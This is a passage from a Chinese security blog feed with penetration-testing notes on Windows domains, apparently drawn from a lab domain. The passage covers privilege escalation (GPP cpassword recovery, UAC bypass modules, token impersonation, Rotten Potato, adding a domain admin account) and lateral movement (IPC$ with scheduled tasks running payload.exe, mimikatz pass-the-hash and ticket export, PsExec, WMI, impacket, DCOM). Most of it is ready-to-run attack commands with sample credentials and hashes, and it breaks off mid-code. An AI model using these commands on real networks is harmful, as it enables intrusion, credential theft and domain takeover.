alt="在这里插入图片描述"></p><p>找出某个驱动器下所有权限配置有缺陷的文件</p><p>accesschk.exe -uwqs Users c:*.*<br>accesschk.exe -uwqs “Authenticated Users” c:*.*</p><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>参考：<a href="https://www.cnblogs.com/Yang34/p/12492270.html">https://www.cnblogs.com/Yang34/p/12492270.html</a></p><p>文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\SYSVOL\domain\Policies\&#123;8C4C36A7-7BA1-4F33-B2F5-9ADD814299F3&#125;\Machine\Preferences\Groups<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529141335763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529141442942.png" alt="在这里插入图片描述"><br>可以看到cpassword使用aes-256算法加密的。可以进行进行解密</p><p>在powersploit中提供了Get-GPPPassword.ps1脚本。将该脚本导入系统，获取组策略中的密码。<br><img src="https://img-blog.csdnimg.cn/20210529141905518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>msf中也集成了此功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/windows/gather/credentials/gpp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529142521212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Empire查找cpassword，在Empire下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><ul><li><strong>绕UAC提权分析</strong><br>如果计算机的操作系统时windows vista或更高，在权限不够的情况下，访问系统磁盘的根目录，windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，都需要经过UAC（User Account Control,用户账户控制)的认证才能进行。<br>在msf中运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/bypassuac<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529145440756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提权成功</p><ul><li><strong>RunAs模块</strong><br>使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/ask<br></code></pre></td></tr></table></figure><p>创建一个可执行文件，目标机器会运行一个发起提权的请求程序，提示用户是否继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</p><p><img src="https://img-blog.csdnimg.cn/20210529150032475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210529150013701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击确定后再查看权限就是一个高权限了<br><img src="https://img-blog.csdnimg.cn/20210529150121205.png" alt="在这里插入图片描述"><br>要想使用RunAs模块进行提权，当前用户必须在管理员组中或者直到管理员的密码，对UAC的设置则没有要求，在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件（需进行免杀处理)</p><ul><li><strong>Empire 的bypassuac_wscript模块</strong><br>该模块的大致工作原理是，使用c:\windows\wscript.exe执行payload,即可绕过UAC，以管理员权限执行payload.该模块只适用于操作系统为windows7的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的，获取令牌，就可以不提供密码或者其他凭据的情况下访问网络和系统资源。这些令牌存在于系统中（除非系统重启）</p><ul><li><strong>令牌窃取</strong><br>如果已经获取了目标机器的meterpreter shell  首先输入”use incognito”<br>然后输入 “list_tokens -u”<br><img src="https://img-blog.csdnimg.cn/20210529155130864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有两种类型的令牌：一种是Delegation Tokens,也就是授权令牌，它支持交互式登录（例如，可以通过远程桌面登录访问），另一种Impersonation Tokens，也就是模拟令牌，它支持非交互式的会话。令牌数量其实取决于meterperter shell的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。<br>接下来，在incognito中调用impersonate_token假冒令牌<br>需要注意在输入主机名的时候需要输入两个反斜杠(\)<br><img src="https://img-blog.csdnimg.cn/20210529163449689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p>令牌窃取成功</p><ul><li><strong>Rotten Potato本地提权分析</strong><br>如果目标系统中存在有效的令牌，可以通过Rotten Potato程序快速模拟用户令牌来实现权限提升。<br>首先输入”use incognito”命令，然后输入”list_tokens -u”命令，列出可用的令牌。<br>将rottenpotato.exe上传到目标机器中。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">execute -HC -f rottenpotato.exe <br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529190108893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529190821111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>添加域管理员</strong><br>假设网络中设置了域管理进程。在meterpreter会话框中输入”ps”命令，查看系统进程。找到域管理进程，使用migrate命令迁移到该进程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user sec 123456Bo /ad /domain    <span class="hljs-comment">#添加域用户</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sec /ad /domain    <span class="hljs-comment">#添加到域管理员组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain    <span class="hljs-comment">#查看域管理员组</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210529194459556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最开始的权限是不能创建账户的<br><img src="https://img-blog.csdnimg.cn/20210529195733667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529195745269.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210529195924744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里没有域管理员进程就随便以一个高权限，思路是一样的。</p><ul><li><strong>无凭证条件下的权限获取分析</strong><br>Responder嗅探<br>参考文章：<a href="https://blog.csdn.net/nzjdsds/article/details/94314995">https://blog.csdn.net/nzjdsds/article/details/94314995</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass waf笔记</title>
    <link href="/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e629a249cbb88c6e38d18c0383e31b69efba2f48b0ef94601f5f6ab4faf2e5bd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域内横向移动</title>
    <link href="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h2><p>在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。</p><ul><li><strong>IPC</strong><br>  IPC共享“命名管道”的资源，是为实现进程间通信而开放的命令管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<br>  IPC利用条件<br>  1.一般来讲 ipc$需要139，445端口的支持。<br>  2.管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有逻辑盘(c$,d$,e$等）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:username<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210530130938242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\DC\c$<br>或<br><span class="hljs-built_in">dir</span> \\ip\c$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132029857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.tasklist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /S 10.10.10.11 /U de1ay /P 274355ZWz<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132132743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.at 计划任务<br>确认目标系统时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time \\10.10.10.11<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132358206.png" alt="在这里插入图片描述"><br>将文件复制到目标系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy payload.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210530132907274.png" alt="在这里插入图片描述"></p><p>使用at创建计划任务（现基本为schtasks命令了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在下午1.30运行这个程序</span><br>at  \\10.10.10.11 1.30 PM C:\payload.exe<br><span class="hljs-comment">#清除at记录</span><br>at \\10.10.10.11 7(at的任务<span class="hljs-built_in">id</span>号） /delete<br><span class="hljs-comment">#使用at命令执行命令并将结果写入文件</span><br>at \\10.10.10.11 4.41 PM cmd.exe /c <span class="hljs-string">&quot;ipconfig &gt;c:\1.txt&quot;</span><br></code></pre></td></tr></table></figure><p>使用schtasks命令创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在远程主机中创建名称为”one&quot;的计划任务，该计划任务开机时启动，启动程序为c盘下的s.exe文件,启动权限为system</span><br>schtasks /create /s 10.10.10.11 /tn one /sc onstart /tr c:\s.exe /ru system /f <br><span class="hljs-comment">#执行该计划任务(在建立ipc连接后不需要输入密码，如果没有建立Ipc连接需要输入密码添加  /u:username /p:password</span><br>schtasks /run /s 10.10.10.11 /i /tn <span class="hljs-string">&quot;one&quot;</span><br><span class="hljs-comment">#执行完后删除计划任务</span><br>schtasks /delete /s 10.10.10.11 /tn <span class="hljs-string">&quot;one&quot;</span> /f<br></code></pre></td></tr></table></figure><p>此后还需要删除ipc$</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><ul><li><strong>mimikatatz</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /ntlm:c271ea43b54feee894fa2d0860e8914f&quot;</span><br></code></pre></td></tr></table></figure><p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="https://img-blog.csdnimg.cn/20210531155122114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用AES-256密码进行哈希传递</strong><br>获取AES-256密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span><br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210531155712911.png" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /aes256:9c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9&quot;</span><br></code></pre></td></tr></table></figure><p>使用AES-256目标机上必须装有KB2871997，该补丁禁止本地管理员权限与远程主机进行连接。也就是无法通过本地管理员权限对远程计算机使用PsExec,wmi等。<br>也无法进行常规的哈希传递攻击，但Administrator(SID为500）依然可以。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同样提供了不需要管理员权限进行横向渗透测试的方法。例如票据传递。</p><ul><li><strong>使用Mimikatz进行票据传递</strong><br> 将内存中的票据导出</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>执行命令后会在当前目录多个服务的票据文件。<br>使用mimikatz清除内存中的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::purge<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531163654397.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::ptt <span class="hljs-string">&quot;票据文件路径&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531164927845.png" alt="在这里插入图片描述"></p><ul><li><strong>PsExec的使用</strong><br>先建立ipc连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取system</span><br>PsExec.exe -accepteula \\10.10.10.11 -s cmd.exe<br><span class="hljs-comment">#获取admin权限</span><br>PsExec.exe -accepteula \\10.10.10.11  cmd.exe<br><span class="hljs-comment">#执行命令</span><br>PsExec.exe \\10.10.10.11 -u de1ay -p 274355ZWz cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531172128129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p><ul><li><strong>msf中psexec</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/smb/psexec<br>exploit/windows/smb/psexec_psh(PsExec的powershell版本）<br></code></pre></td></tr></table></figure><h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单。于是攻击者逐渐开始使用WMI进行横向移动。通过渗透发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将wmi的操作记录在日志中。</p><ul><li><strong>基本命令</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.10.10.11 /user:de1ay /password:274355ZWz process call create <span class="hljs-string">&quot;cmd.exe&quot;</span> /c ipconfig&gt;C:\ip.txt<span class="hljs-string">&quot;</span><br><span class="hljs-string">#查看执行结果</span><br><span class="hljs-string">type \\10.10.10.11\c$\ip.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531223510977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>impacket 工具包中的wmiexec</strong><br>进入&#x2F;usr&#x2F;local&#x2F;bin目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wmiexec.py  de1ay:274355ZWz@192.168.252.16<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531224615512.png" alt="在这里插入图片描述"></p><ul><li><strong>wmiexec.vbs</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.11 de1ay 274355ZWz<br><span class="hljs-comment">#在远程主机上执行命令</span><br>csrcipt.exe wmiexec.vbs /cmd 10.10.10.11 de1ay 274355ZWz <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531225801991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-WmiCommand.ps1</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;文明密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210531231216112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-WMIMethod</strong><br>利用powershell自带得invoke-wmimethod，可以在远程系统中执行命令和指定程序。在powershell命令行环境中执行如下命令，可以以非交互式的方式执行命令，但不会回显。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;de1ay\de1ay&quot;</span><br><span class="hljs-variable">$Password</span>=ConvertTo-SecureString -String <span class="hljs-string">&quot;274355ZWz&quot;</span> -AsplainText -force<br><span class="hljs-variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br> Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="hljs-string">&quot;calc.exe&quot;</span> -ComputerName <span class="hljs-string">&quot;10.10.10.11&quot;</span> -Credential <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><p>目标系统交互运行calc.exe程序。</p><ul><li><strong>smbexec使用</strong><br>impackt工具包中的smbexec.py</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbexec.py de1ay/de1ay:274355ZWz@192.168.43.16<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210604232720985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h2><p>DCOM(分布式组件对象模型)是微软的一系列概念和接口。通过DCOM，客户端程序对象能过够向网络中另一台计算机上的服务器程序对象发送请求。</p><ul><li><strong>通过本地DCOM执行命令</strong><br>1.获取DCOM程序列表<br>Get-CimInstance这个cmdlet(powershell命令)默认只在powershell3.0以上版本中存在。也就是说，只有windows server2012及以上的版本才可以使用Get-CimInstance。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-CimInstance  Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605122217481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-WmiObject -Namespace  ROOT\CIMV2 -Class Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605123315602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用DCOM执行任意命令</strong><br>在本地启动一个管理员权限的powershell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605124258832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用DCOM在远程机器上执行命令</strong><br>在使用该方法时，必须使用具有本地管理员权限的账户<br>1.通过ipc$连接远程计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 